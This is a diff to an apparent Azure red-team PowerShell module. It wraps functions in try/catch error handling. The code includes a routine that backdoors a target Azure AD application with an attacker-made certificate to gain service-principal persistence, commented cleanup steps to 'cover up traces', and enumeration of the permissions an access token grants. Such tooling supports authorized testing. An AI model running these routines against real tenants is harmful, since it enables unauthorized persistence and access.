@@ -35,40 +35,47 @@ function Parse-JWTtokenRT {
         $Json
     )
  
-    if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid JWT token!" -ErrorAction Stop }
- 
-    $tokenheader = $token.Split(".")[0].Replace('-', '+').Replace('_', '/')
- 
-    while ($tokenheader.Length % 4) { $tokenheader += "=" }
- 
-    $tokenPayload = $token.Split(".")[1].Replace('-', '+').Replace('_', '/')
-    while ($tokenPayload.Length % 4) { $tokenPayload += "=" }
- 
-    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
-    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
-    $tokobj = $tokenArray | ConvertFrom-Json
+    try {
+        if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid JWT token!" -ErrorAction Stop }
+     
+        $tokenheader = $token.Split(".")[0].Replace('-', '+').Replace('_', '/')
+     
+        while ($tokenheader.Length % 4) { $tokenheader += "=" }
+     
+        $tokenPayload = $token.Split(".")[1].Replace('-', '+').Replace('_', '/')
+        while ($tokenPayload.Length % 4) { $tokenPayload += "=" }
+     
+        $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
+        $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
+        $tokobj = $tokenArray | ConvertFrom-Json
 
-    if ([bool]($tokobj.PSobject.Properties.name -match "iat")) {
-        $tokobj.iat = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.iat)
-    }
+        if ([bool]($tokobj.PSobject.Properties.name -match "iat")) {
+            $tokobj.iat = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.iat)
+        }
 
-    if ([bool]($tokobj.PSobject.Properties.name -match "nbf")) {
-        $tokobj.nbf = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.nbf)
-    }
+        if ([bool]($tokobj.PSobject.Properties.name -match "nbf")) {
+            $tokobj.nbf = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.nbf)
+        }
 
-    if ([bool]($tokobj.PSobject.Properties.name -match "exp")) {
-        $tokobj.exp = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.exp)
-    }
+        if ([bool]($tokobj.PSobject.Properties.name -match "exp")) {
+            $tokobj.exp = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.exp)
+        }
 
-    if ([bool]($tokobj.PSobject.Properties.name -match "xms_tcdt")) {
-        $tokobj.xms_tcdt = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.xms_tcdt)
-    }
+        if ([bool]($tokobj.PSobject.Properties.name -match "xms_tcdt")) {
+            $tokobj.xms_tcdt = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.xms_tcdt)
+        }
 
-    if($Json) {
-        Return ($tokobj | ConvertTo-Json)
+        if($Json) {
+            Return ($tokobj | ConvertTo-Json)
+        }
+        
+        return $tokobj
     }
-    
-    return $tokobj
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
+    }
 }
 
 Function Connect-ART {
@@ -126,75 +133,82 @@ Function Connect-ART {
         $Password = $null
     )
 
-    if (-not (Get-Module -ListAvailable -Name Az.Accounts)) {
-        Write-Verbose "Az Powershell module not installed or not loaded. Installing it..."
-        Install-Module -Name Az -Force -Confirm -Scope CurrentUser -AllowClobber
-    }
-
-    if($PsCmdlet.ParameterSetName -eq "Token" -and ($AccessToken -eq $null -or $AccessToken -eq "")) {
-        if($TokenFromAzCli) {
-            Write-Verbose "Acquiring Azure access token from az cli..."
-            $AccessToken = Get-ARTAccessTokenAzCli -Resource https://management.azure.com
-            $KeyVaultAccessToken = Get-ARTAccessTokenAzCli -Resource https://vault.azure.net
-        }
-        else {
-            Write-Verbose "Acquiring Azure access token from Connect-AzAccount..."
-            $AccessToken = Get-ARTAccessTokenAz -Resource https://management.azure.com
-            $KeyVaultAccessToken = Get-ARTAccessTokenAz -Resource https://vault.azure.net
-        }
-    }
-
-    if($AccessToken -ne $null -and $AccessToken.Length -gt 0) {
-        Write-Verbose "Azure authentication via provided access token..."
-        $parsed = Parse-JWTtokenRT $AccessToken
-        $tenant = $parsed.tid
-
-        if(-not ($parsed.aud -like 'https://management.*')) {
-            Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
+    try {
+        if (-not (Get-Module -ListAvailable -Name Az.Accounts)) {
+            Write-Verbose "Az Powershell module not installed or not loaded. Installing it..."
+            Install-Module -Name Az -Force -Confirm -Scope CurrentUser -AllowClobber
         }
 
-        if ([bool]($parsed.PSobject.Properties.name -match "upn")) {
-            Write-Verbose "Token belongs to a User Principal."
-            $account = $parsed.upn
-        }
-        elseif ([bool]($parsed.PSobject.Properties.name -match "unique_name")) {
-            Write-Verbose "Token belongs to a User Principal."
-            $account = $parsed.unique_name
-        }
-        else {
-            Write-Verbose "Token belongs to a Service Principal."
-            $account = $parsed.appId
-        }
-
-        $headers = @{
-            'Authorization' = "Bearer $AccessToken"
+        if($PsCmdlet.ParameterSetName -eq "Token" -and ($AccessToken -eq $null -or $AccessToken -eq "")) {
+            if($TokenFromAzCli) {
+                Write-Verbose "Acquiring Azure access token from az cli..."
+                $AccessToken = Get-ARTAccessTokenAzCli -Resource https://management.azure.com
+                $KeyVaultAccessToken = Get-ARTAccessTokenAzCli -Resource https://vault.azure.net
+            }
+            else {
+                Write-Verbose "Acquiring Azure access token from Connect-AzAccount..."
+                $AccessToken = Get-ARTAccessTokenAz -Resource https://management.azure.com
+                $KeyVaultAccessToken = Get-ARTAccessTokenAz -Resource https://vault.azure.net
+            }
         }
 
-        if($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0) {
-            $SubscriptionId = (Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers $headers).value.subscriptionId
-        }
+        if($AccessToken -ne $null -and $AccessToken.Length -gt 0) {
+            Write-Verbose "Azure authentication via provided access token..."
+            $parsed = Parse-JWTtokenRT $AccessToken
+            $tenant = $parsed.tid
 
-        if ($KeyVaultAccessToken -eq $null -or $KeyVaultAccessToken.Length -eq 0) { 
-            Write-Verbose "Connecting to Azure as Account $account ..."
-            Connect-AzAccount -AccessToken $AccessToken -Tenant $tenant -AccountId $account -SubscriptionId $SubscriptionId
-        } else {
-
-            $parsedvault = Parse-JWTtokenRT $KeyVaultAccessToken
-
-            if(-not ($parsedvault.aud -eq 'https://vault.azure.net')) {
-                Write-Warning "Provided JWT Key Vault Access Token is not scoped to `"https://vault.azure.net`"! Instead its scope is: `"$($parsedvault.aud)`" . That will not work!"
+            if(-not ($parsed.aud -like 'https://management.*')) {
+                Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
             }
 
-            Write-Verbose "Connecting to Azure & Azure Vault as Account $account ..."
-            Connect-AzAccount -AccessToken $AccessToken -Tenant $tenant -AccountId $account -SubscriptionId $SubscriptionId -KeyVaultAccessToken $KeyVaultAccessToken
+            if ([bool]($parsed.PSobject.Properties.name -match "upn")) {
+                Write-Verbose "Token belongs to a User Principal."
+                $account = $parsed.upn
+            }
+            elseif ([bool]($parsed.PSobject.Properties.name -match "unique_name")) {
+                Write-Verbose "Token belongs to a User Principal."
+                $account = $parsed.unique_name
+            }
+            else {
+                Write-Verbose "Token belongs to a Service Principal."
+                $account = $parsed.appId
+            }
+
+            $headers = @{
+                'Authorization' = "Bearer $AccessToken"
+            }
+
+            if($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0) {
+                $SubscriptionId = (Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers $headers).value.subscriptionId
+            }
+
+            if ($KeyVaultAccessToken -eq $null -or $KeyVaultAccessToken.Length -eq 0) { 
+                Write-Verbose "Connecting to Azure as Account $account ..."
+                Connect-AzAccount -AccessToken $AccessToken -Tenant $tenant -AccountId $account -SubscriptionId $SubscriptionId
+            } else {
+
+                $parsedvault = Parse-JWTtokenRT $KeyVaultAccessToken
+
+                if(-not ($parsedvault.aud -eq 'https://vault.azure.net')) {
+                    Write-Warning "Provided JWT Key Vault Access Token is not scoped to `"https://vault.azure.net`"! Instead its scope is: `"$($parsedvault.aud)`" . That will not work!"
+                }
+
+                Write-Verbose "Connecting to Azure & Azure Vault as Account $account ..."
+                Connect-AzAccount -AccessToken $AccessToken -Tenant $tenant -AccountId $account -SubscriptionId $SubscriptionId -KeyVaultAccessToken $KeyVaultAccessToken
+            }
+        }
+        else {
+            $passwd = ConvertTo-SecureString $Password -AsPlainText -Force
+            $creds = New-Object System.Management.Automation.PSCredential ($Username, $passwd)
+            
+            Write-Verbose "Azure authentication via provided creds..."
+            Connect-AzAccount -Credential $creds
         }
     }
-    else {
-        $passwd = ConvertTo-SecureString $Password -AsPlainText -Force
-        $creds = New-Object System.Management.Automation.PSCredential ($Username, $passwd)
-        
-        Write-Verbose "Azure authentication via provided creds..."
-        Connect-AzAccount -Credential $creds
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
     }
 }
 
@@ -229,83 +243,90 @@ Function Connect-ARTADServicePrincipal {
         $TargetApplicationName
     )
 
-    $fname = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
-    $certPath = "$Env:Temp\$fname.key.pfx"
-    $certStorePath = "cert:\currentuser\my"
-    $appKeyIdentifier = "Test123"
-    $certpwd = "VeryStrongCertificatePassword123"
-
     try {
-        $certDnsName = (Get-AzureADDomain | ? { $_.IsDefault -eq $true } ).Name
+        $fname = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
+        $certPath = "$Env:Temp\$fname.key.pfx"
+        $certStorePath = "cert:\currentuser\my"
+        $appKeyIdentifier = "Test123"
+        $certpwd = "VeryStrongCertificatePassword123"
+
+        try {
+            $certDnsName = (Get-AzureADDomain | ? { $_.IsDefault -eq $true } ).Name
+        }
+        catch {
+            Write-Host "[!] Get-AzureADDomain failed. Probably not authenticated."
+            Write-Host "[!] Use: Connect-AzureAD or Connect-ARTAD before attempting authentication as Service Principal!"
+
+            Throw
+            Return
+        }
+
+        $UserId = (Get-AzureADUser -Filter "UserPrincipalName eq '$((Get-AzureADCurrentSessionInfo).Account)'").ObjectId
+
+        $pwd = ConvertTo-SecureString -String $certpwd -Force -AsPlainText
+        $cert = Get-ChildItem -Path $certStorePath | where { $_.subject -eq "CN=$certDnsName" } 
+
+        if($cert -eq $null -or $cert.Thumbprint -eq "") {
+            Write-Verbose "Step 1. Create the self signed cert and load it to local store."
+            
+            $currentDate = Get-Date
+            $endDate = $currentDate.AddYears(1)
+            $notAfter = $endDate.AddYears(1)
+
+            $thumb = (New-SelfSignedCertificate -CertStoreLocation $certStorePath -DnsName $certDnsName -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
+        }
+        else {
+            Write-Verbose "Step 1. Get self signed cert and load it to local store."
+            $cert
+            $thumb = $cert.Thumbprint
+        }
+
+        Write-Verbose "`t1.1. Export PFX certificate to file: $certPath"
+        Export-PfxCertificate -cert "$certStorePath\$thumb" -FilePath $certPath -Password $pwd | Out-Null
+
+        Write-Verbose "Step 2. Load exported certificate"
+        Write-Verbose "`t2.1. Certificate Thumbprint: $thumb"
+
+        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate($certPath, $pwd)
+        $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
+
+        Write-Verbose "Step 3. Get Service Principal and connect it to the Application."
+        $sp = Get-AzureADServicePrincipal -Filter "DisplayName eq '$TargetApplicationName'"
+        $app = Get-AzureADApplication | ? { $_.DisplayName -eq $TargetApplicationName -or $_.ObjectId -eq $TargetApplicationName }
+
+        Write-Verbose "Step 4. Backdoor target Azure AD Application with newly created Certificate."
+        $key = New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -CustomKeyIdentifier $appKeyIdentifier -StartDate $currentDate -EndDate $endDate -Type AsymmetricX509Cert -Usage Verify -Value $keyValue
+
+        Write-Host "Perform cleanup with command:"
+        Write-Host "`tPS> Remove-ARTServicePrincipalKey -ApplicationName $($app.ObjectId) -KeyId $($key.KeyId)"
+
+        Write-Verbose "`nStep 5. Authenticate to Azure AD as a Service Principal."
+
+        try {
+            Write-Verbose "`tCooling down for 15 seconds to let Azure account for created certificate.`n"
+            Start-Sleep -Seconds 15
+            Connect-AzureAD -TenantId $sp.AppOwnerTenantId -ApplicationId $sp.AppId -CertificateThumbprint $thumb | Out-Null
+        }
+        catch {
+            Write-Host "[!] Failed: Could not authenticate to Azure AD as Service Principal!"
+            Return
+        }
+
+        #Write-Verbose "`n[.] To manually remove backdoor certificate from the Application and cover up traces use following command AS $((Get-AzureADCurrentSessionInfo).Account):`n"
+        #Write-Verbose "`tRemove-AzureADApplicationKeyCredential -ObjectId $($app.ObjectId) -KeyId $($key.KeyId)`n"
+        #Write-Verbose "`tGet-ChildItem -Path $certStorePath | where { `$_.subject -eq `"CN=$certDnsName`" } | Remove-Item"
+        #Write-Verbose "`tRemove-Item -Path $certPath | Out-Null"
+
+        Write-Host "`n`n[+] You are now authenticated as:`n"
+        Get-AzureADDomain | Out-Null
+        Start-Sleep -Seconds 3
+        Get-AzureADCurrentSessionInfo
     }
     catch {
-        Write-Host "[!] Get-AzureADDomain failed. Probably not authenticated."
-        Write-Host "[!] Use: Connect-AzureAD or Connect-ARTAD before attempting authentication as Service Principal!"
-
+        Write-Host "[!] Function failed!"
         Throw
         Return
     }
-
-    $UserId = (Get-AzureADUser -Filter "UserPrincipalName eq '$((Get-AzureADCurrentSessionInfo).Account)'").ObjectId
-
-    $pwd = ConvertTo-SecureString -String $certpwd -Force -AsPlainText
-    $cert = Get-ChildItem -Path $certStorePath | where { $_.subject -eq "CN=$certDnsName" } 
-
-    if($cert -eq $null -or $cert.Thumbprint -eq "") {
-        Write-Verbose "Step 1. Create the self signed cert and load it to local store."
-        
-        $currentDate = Get-Date
-        $endDate = $currentDate.AddYears(1)
-        $notAfter = $endDate.AddYears(1)
-
-        $thumb = (New-SelfSignedCertificate -CertStoreLocation $certStorePath -DnsName $certDnsName -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
-    }
-    else {
-        Write-Verbose "Step 1. Get self signed cert and load it to local store."
-        $cert
-        $thumb = $cert.Thumbprint
-    }
-
-    Write-Verbose "`t1.1. Export PFX certificate to file: $certPath"
-    Export-PfxCertificate -cert "$certStorePath\$thumb" -FilePath $certPath -Password $pwd | Out-Null
-
-    Write-Verbose "Step 2. Load exported certificate"
-    Write-Verbose "`t2.1. Certificate Thumbprint: $thumb"
-
-    $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate($certPath, $pwd)
-    $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
-
-    Write-Verbose "Step 3. Get Service Principal and connect it to the Application."
-    $sp = Get-AzureADServicePrincipal -Filter "DisplayName eq '$TargetApplicationName'"
-    $app = Get-AzureADApplication | ? { $_.DisplayName -eq $TargetApplicationName -or $_.ObjectId -eq $TargetApplicationName }
-
-    Write-Verbose "Step 4. Backdoor target Azure AD Application with newly created Certificate."
-    $key = New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -CustomKeyIdentifier $appKeyIdentifier -StartDate $currentDate -EndDate $endDate -Type AsymmetricX509Cert -Usage Verify -Value $keyValue
-
-    Write-Host "Perform cleanup with command:"
-    Write-Host "`tPS> Remove-ARTServicePrincipalKey -ApplicationName $($app.ObjectId) -KeyId $($key.KeyId)"
-
-    Write-Verbose "`nStep 5. Authenticate to Azure AD as a Service Principal."
-
-    try {
-        Write-Verbose "`tCooling down for 15 seconds to let Azure account for created certificate.`n"
-        Start-Sleep -Seconds 15
-        Connect-AzureAD -TenantId $sp.AppOwnerTenantId -ApplicationId $sp.AppId -CertificateThumbprint $thumb | Out-Null
-    }
-    catch {
-        Write-Host "[!] Failed: Could not authenticate to Azure AD as Service Principal!"
-        Return
-    }
-
-    #Write-Verbose "`n[.] To manually remove backdoor certificate from the Application and cover up traces use following command AS $((Get-AzureADCurrentSessionInfo).Account):`n"
-    #Write-Verbose "`tRemove-AzureADApplicationKeyCredential -ObjectId $($app.ObjectId) -KeyId $($key.KeyId)`n"
-    #Write-Verbose "`tGet-ChildItem -Path $certStorePath | where { `$_.subject -eq `"CN=$certDnsName`" } | Remove-Item"
-    #Write-Verbose "`tRemove-Item -Path $certPath | Out-Null"
-
-    Write-Host "`n`n[+] You are now authenticated as:`n"
-    Get-AzureADDomain | Out-Null
-    Start-Sleep -Seconds 3
-    Get-AzureADCurrentSessionInfo
 }
 
 Function Remove-ARTServicePrincipalKey {
@@ -334,27 +355,34 @@ Function Remove-ARTServicePrincipalKey {
         $KeyId
     )
 
-    $certStorePath = "cert:\currentuser\my"
-    $certPath = "$Env:Temp\*.key.pfx"
-
     try {
-        $certDnsName = (Get-AzureADDomain | ? { $_.IsDefault -eq $true } ).Name
+        $certStorePath = "cert:\currentuser\my"
+        $certPath = "$Env:Temp\*.key.pfx"
+
+        try {
+            $certDnsName = (Get-AzureADDomain | ? { $_.IsDefault -eq $true } ).Name
+        }
+        catch {
+            Write-Host "[!] Get-AzureADDomain failed. Probably not authenticated."
+            Write-Host "[!] Use: Connect-AzureAD or Connect-ARTAD before attempting authentication as Service Principal!"
+
+            Throw
+            Return
+        }
+
+        del $certPath | Out-Null
+        Get-ChildItem -Path $certStorePath | where { $_.subject -eq "CN=$certDnsName" } | Remove-Item
+
+        $app = Get-AzureADApplication | ? { $_.DisplayName -eq $ApplicationName -or $_.ObjectId -eq $ApplicationName }
+        Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $KeyId
+
+        Write-Host "[+] Cleanup finished."
     }
     catch {
-        Write-Host "[!] Get-AzureADDomain failed. Probably not authenticated."
-        Write-Host "[!] Use: Connect-AzureAD or Connect-ARTAD before attempting authentication as Service Principal!"
-
+        Write-Host "[!] Function failed!"
         Throw
         Return
     }
-
-    del $certPath | Out-Null
-    Get-ChildItem -Path $certStorePath | where { $_.subject -eq "CN=$certDnsName" } | Remove-Item
-
-    $app = Get-AzureADApplication | ? { $_.DisplayName -eq $ApplicationName -or $_.ObjectId -eq $ApplicationName }
-    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $KeyId
-
-    Write-Host "[+] Cleanup finished."
 }
 
 
@@ -400,53 +428,60 @@ Function Connect-ARTAD {
         $Password = $null
     )
 
-    if (-not (Get-Module -ListAvailable -Name AzureAD)) {
-        Write-Verbose "AzureAD Powershell module not installed or not loaded. Installing it..."
-        Install-Module -Name AzureAD -Force -Confirm -Scope CurrentUser -AllowClobber
-    }
+    try {
+        if (-not (Get-Module -ListAvailable -Name AzureAD)) {
+            Write-Verbose "AzureAD Powershell module not installed or not loaded. Installing it..."
+            Install-Module -Name AzureAD -Force -Confirm -Scope CurrentUser -AllowClobber
+        }
 
-    if($PsCmdlet.ParameterSetName -eq "Token" -and ($AccessToken -eq $null -or $AccessToken -eq "")) {
-        Write-Verbose "Acquiring Azure access token from Connect-AzureAD..."
-        if($TokenFromAzCli) {
-            Write-Verbose "Acquiring Azure access token from az cli..."
-            $AccessToken = Get-ARTAccessTokenAzCli -Resource https://graph.microsoft.com
+        if($PsCmdlet.ParameterSetName -eq "Token" -and ($AccessToken -eq $null -or $AccessToken -eq "")) {
+            Write-Verbose "Acquiring Azure access token from Connect-AzureAD..."
+            if($TokenFromAzCli) {
+                Write-Verbose "Acquiring Azure access token from az cli..."
+                $AccessToken = Get-ARTAccessTokenAzCli -Resource https://graph.microsoft.com
+            }
+            else {
+                Write-Verbose "Acquiring Azure access token from Connect-AzAccount..."
+                $AccessToken = Get-ARTAccessTokenAz -Resource https://graph.microsoft.com
+            }
+        }
+
+        if($AccessToken -ne $null -and $AccessToken.Length -gt 0) {
+            Write-Verbose "Azure AD authentication via provided access token..."
+            $parsed = Parse-JWTtokenRT $AccessToken
+            $tenant = $parsed.tid
+
+            if(-not $parsed.aud -like 'https://graph.*') {
+                Write-Warning "Provided JWT Access Token is not scoped to https://graph.microsoft.com or https://graph.windows.net! Instead its scope is: $($parsed.aud)"
+            }
+
+            if ([bool]($parsed.PSobject.Properties.name -match "upn")) {
+                Write-Verbose "Token belongs to a User Principal."
+                $account = $parsed.upn
+            }
+            elseif ([bool]($parsed.PSobject.Properties.name -match "unique_name")) {
+                Write-Verbose "Token belongs to a User Principal."
+                $account = $parsed.unique_name
+            }
+            else {
+                Write-Verbose "Token belongs to a Service Principal."
+                $account = $parsed.appId
+            }
+
+            Connect-AzureAD -AadAccessToken $AccessToken -TenantId $tenant -AccountId $account
         }
         else {
-            Write-Verbose "Acquiring Azure access token from Connect-AzAccount..."
-            $AccessToken = Get-ARTAccessTokenAz -Resource https://graph.microsoft.com
+            $passwd = ConvertTo-SecureString $Password -AsPlainText -Force
+            $creds = New-Object System.Management.Automation.PSCredential ($Username, $passwd)
+            
+            Write-Verbose "Azure AD authentication via provided creds..."
+            Connect-AzureAD -Credential $creds
         }
     }
-
-    if($AccessToken -ne $null -and $AccessToken.Length -gt 0) {
-        Write-Verbose "Azure AD authentication via provided access token..."
-        $parsed = Parse-JWTtokenRT $AccessToken
-        $tenant = $parsed.tid
-
-        if(-not $parsed.aud -like 'https://graph.*') {
-            Write-Warning "Provided JWT Access Token is not scoped to https://graph.microsoft.com or https://graph.windows.net! Instead its scope is: $($parsed.aud)"
-        }
-
-        if ([bool]($parsed.PSobject.Properties.name -match "upn")) {
-            Write-Verbose "Token belongs to a User Principal."
-            $account = $parsed.upn
-        }
-        elseif ([bool]($parsed.PSobject.Properties.name -match "unique_name")) {
-            Write-Verbose "Token belongs to a User Principal."
-            $account = $parsed.unique_name
-        }
-        else {
-            Write-Verbose "Token belongs to a Service Principal."
-            $account = $parsed.appId
-        }
-
-        Connect-AzureAD -AadAccessToken $AccessToken -TenantId $tenant -AccountId $account
-    }
-    else {
-        $passwd = ConvertTo-SecureString $Password -AsPlainText -Force
-        $creds = New-Object System.Management.Automation.PSCredential ($Username, $passwd)
-        
-        Write-Verbose "Azure AD authentication via provided creds..."
-        Connect-AzureAD -Credential $creds
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
     }
 }
 
@@ -470,19 +505,26 @@ Function Get-ARTAccessTokenAzCli {
         $Resource = $null
     )
 
-    $token = $null
+    try {
+        $token = $null
 
-    if($Resource -ne $null -and $Resource.Length -gt 0) {
-        $token = ((az account get-access-token --resource $Resource) | ConvertFrom-Json).accessToken
+        if($Resource -ne $null -and $Resource.Length -gt 0) {
+            $token = ((az account get-access-token --resource $Resource) | ConvertFrom-Json).accessToken
+        }
+        else {
+            $token = ((az account get-access-token) | ConvertFrom-Json).accessToken
+        }
+
+        $parsed = Parse-JWTtokenRT $token
+        Write-Verbose "Token for Resource: $($parsed.aud)"
+
+        Return $token
     }
-    else {
-        $token = ((az account get-access-token) | ConvertFrom-Json).accessToken
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
     }
-
-    $parsed = Parse-JWTtokenRT $token
-    Write-Verbose "Token for Resource: $($parsed.aud)"
-
-    Return $token
 }
 
 Function Get-ARTAccessTokenAz {
@@ -504,19 +546,26 @@ Function Get-ARTAccessTokenAz {
         $Resource = $null
     )
 
-    $token = $null
+    try {
+        $token = $null
 
-    if($Resource -ne $null -and $Resource.Length -gt 0) {
-        $token = (Get-AzAccessToken -Resource $Resource).Token
+        if($Resource -ne $null -and $Resource.Length -gt 0) {
+            $token = (Get-AzAccessToken -Resource $Resource).Token
+        }
+        else {
+            $token = (Get-AzAccessToken).Token
+        }
+
+        $parsed = Parse-JWTtokenRT $token
+        Write-Verbose "Token for Resource: $($parsed.aud)"
+
+        Return $token
     }
-    else {
-        $token = (Get-AzAccessToken).Token
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
     }
-
-    $parsed = Parse-JWTtokenRT $token
-    Write-Verbose "Token for Resource: $($parsed.aud)"
-
-    Return $token
 }
 
 #
@@ -704,98 +753,105 @@ Function Get-ARTResource {
         $Text
     )
 
-    if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
-        Write-Verbose "Access Token not provided. Requesting one from Get-AzAccessToken ..."
-        $AccessToken = Get-ARTAccessTokenAz
-    }
-
-    if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
-        Write-Error "Could not obtain required Access Token!"
-        Return
-    }
-
-    $headers = @{
-        'Authorization' = "Bearer $AccessToken"
-    }
-
-    $parsed = Parse-JWTtokenRT $AccessToken
-
-    if(-not $parsed.aud -like 'https://management.*') {
-        Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
-    }
-
-    $resource = $parsed.aud
-
-    Write-Verbose "Will use resource: $resource"
-
-    if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
-        $SubscriptionId = (Invoke-RestMethod -Uri "$resource/subscriptions?api-version=2020-01-01" -Headers $headers).value.subscriptionId 
-    }
-
-    if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
-        Write-Error "Could not acquire Subscription ID!"
-        Return
-    }
-
-    Write-Verbose "Enumerating resources on subscription: $SubscriptionId"
-
-    $resources = (Invoke-RestMethod -Uri "$resource/subscriptions/$SubscriptionId/resources?api-version=2021-04-01" -Headers $headers).value
-
-    if($resources.Length -eq 0 ) {
-        if($Text) {
-            Write-Host "No available resourources found or lacking required permissions."
-        }
-        else {
-            Write-Verbose "No available resourources found or lacking required permissions."
+    try {
+        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
+            Write-Verbose "Access Token not provided. Requesting one from Get-AzAccessToken ..."
+            $AccessToken = Get-ARTAccessTokenAz
         }
 
-        Return
-    }
-
-    $Coll = New-Object System.Collections.ArrayList
-
-    $resources | % {
-        try
-        {
-            $permissions = ((Invoke-RestMethod -Uri "https://management.azure.com$($_.id)/providers/Microsoft.Authorization/permissions?api-version=2018-07-01" -Headers $headers).value).actions
-        }
-        catch
-        {
-            $permissions = @()
+        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
+            Write-Error "Could not obtain required Access Token!"
+            Return
         }
 
-        $obj = [PSCustomObject]@{
-            Name              = $_.name
-            ResourceGroupName = $_.id.Split('/')[4]
-            ResourceType      = $_.type
-            Permissions       = $permissions
-            Scope             = $_.id
+        $headers = @{
+            'Authorization' = "Bearer $AccessToken"
         }
 
-        $null = $Coll.Add($obj)
-    }
+        $parsed = Parse-JWTtokenRT $AccessToken
 
-    if ($Text) {
-        Write-Host "== Accessible Azure Resources & Permissions ==`n"
+        if(-not $parsed.aud -like 'https://management.*') {
+            Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
+        }
 
-        $num = 1
-        $Coll | % {
-            Write-Host "`n`t$($num)."
-            Write-Host "`tName                :`t$($_.Name)"
-            Write-Host "`tResource Group Name :`t$($_.ResourceGroupName)"
-            Write-Host "`tResource Type       :`t$($_.ResourceType)"
-            Write-Host "`tScope               :`t$($_.Scope)"
-            Write-Host "`tPermissions: $($_.Permissions.Length)"
-            
-            $_.Permissions | % {
-                Write-Host "`t`t- $_"
+        $resource = $parsed.aud
+
+        Write-Verbose "Will use resource: $resource"
+
+        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
+            $SubscriptionId = (Invoke-RestMethod -Uri "$resource/subscriptions?api-version=2020-01-01" -Headers $headers).value.subscriptionId 
+        }
+
+        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
+            Write-Error "Could not acquire Subscription ID!"
+            Return
+        }
+
+        Write-Verbose "Enumerating resources on subscription: $SubscriptionId"
+
+        $resources = (Invoke-RestMethod -Uri "$resource/subscriptions/$SubscriptionId/resources?api-version=2021-04-01" -Headers $headers).value
+
+        if($resources.Length -eq 0 ) {
+            if($Text) {
+                Write-Host "No available resourources found or lacking required permissions."
+            }
+            else {
+                Write-Verbose "No available resourources found or lacking required permissions."
             }
 
-            $num += 1
+            Return
+        }
+
+        $Coll = New-Object System.Collections.ArrayList
+
+        $resources | % {
+            try
+            {
+                $permissions = ((Invoke-RestMethod -Uri "https://management.azure.com$($_.id)/providers/Microsoft.Authorization/permissions?api-version=2018-07-01" -Headers $headers).value).actions
+            }
+            catch
+            {
+                $permissions = @()
+            }
+
+            $obj = [PSCustomObject]@{
+                Name              = $_.name
+                ResourceGroupName = $_.id.Split('/')[4]
+                ResourceType      = $_.type
+                Permissions       = $permissions
+                Scope             = $_.id
+            }
+
+            $null = $Coll.Add($obj)
+        }
+
+        if ($Text) {
+            Write-Host "== Accessible Azure Resources & Permissions ==`n"
+
+            $num = 1
+            $Coll | % {
+                Write-Host "`n`t$($num)."
+                Write-Host "`tName                :`t$($_.Name)"
+                Write-Host "`tResource Group Name :`t$($_.ResourceGroupName)"
+                Write-Host "`tResource Type       :`t$($_.ResourceType)"
+                Write-Host "`tScope               :`t$($_.Scope)"
+                Write-Host "`tPermissions: $($_.Permissions.Length)"
+                
+                $_.Permissions | % {
+                    Write-Host "`t`t- $_"
+                }
+
+                $num += 1
+            }
+        }
+        else {
+            $Coll
         }
     }
-    else {
-        $Coll
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
     }
 }
 
@@ -818,7 +874,14 @@ Function Get-ARTADRolePermissions {
         $RoleName
     )
 
-    (Get-AzureADMSRoleDefinition -Filter "displayName eq '$RoleName'").RolePermissions | select -Expand AllowedResourceActions | Format-List
+    try {
